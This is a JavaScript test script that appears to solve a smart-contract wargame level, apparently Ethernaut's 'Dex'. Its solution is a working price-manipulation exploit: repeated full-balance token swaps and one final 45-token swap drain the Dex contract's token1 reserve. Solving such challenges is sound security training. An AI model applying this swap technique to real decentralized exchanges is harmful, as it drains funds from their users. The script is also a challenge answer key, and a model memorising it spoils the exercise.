const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, attacker, challenge, tx

before(async () => {
    ;[s1] = await ethers.getSigners()
    const challengeAddress = await createChallenge("0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F")
    challenge = await ethers.getContractAt("Dex", challengeAddress)
})

it("solves the challenge", async function () {
    let t1 = challenge.token1()
    let t2 = challenge.token2()

    try {
        tx = await challenge.approve(challenge.address, 10000000)
        await tx.wait()

        for (i = 1; i < 6; i++) {
            if (i % 2 != 0) {
                tx = await challenge.swap(t1, t2, await challenge.balanceOf(t1, s1.address))
                await tx.wait()
            } else {
                tx = await challenge.swap(t2, t1, await challenge.balanceOf(t2, s1.address))
                await tx.wait()
            }
            console.log(
                "After swap ",
                i,
                " --------------------------------------------------------------"
            )
            console.log("My t1 balance: ", await challenge.balanceOf(t1, s1.address))
            console.log("My t2 balance: ", await challenge.balanceOf(t2, s1.address))
            console.log("Dex t1 balance: ", await challenge.balanceOf(t1, challenge.address))
            console.log("Dex t2 balance: ", await challenge.balanceOf(t2, challenge.address))
        }

        //last swap => the Dex has only 110 t& and 45 t2 left => to empty the t1 balance of the dex, we need to specify a swap amount of 45 tokens
        console.log("")
        console.log("Swap amount when we provide 45 t2: ", await challenge.getSwapPrice(t2, t1, 45))
        console.log("")
        tx = await challenge.swap(t2, t1, 45)
        await tx.wait()

        console.log(
            "After final swap (6) --------------------------------------------------------------"
        )
        console.log("My t1 balance: ", await challenge.balanceOf(t1, s1.address))
        console.log("My t2 balance: ", await challenge.balanceOf(t2, s1.address))
        console.log("Dex t1 balance: ", await challenge.balanceOf(t1, challenge.address))
        console.log("Dex t2 balance: ", await challenge.balanceOf(t2, challenge.address))
    } catch (err) {
        console.log(err)
    }
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
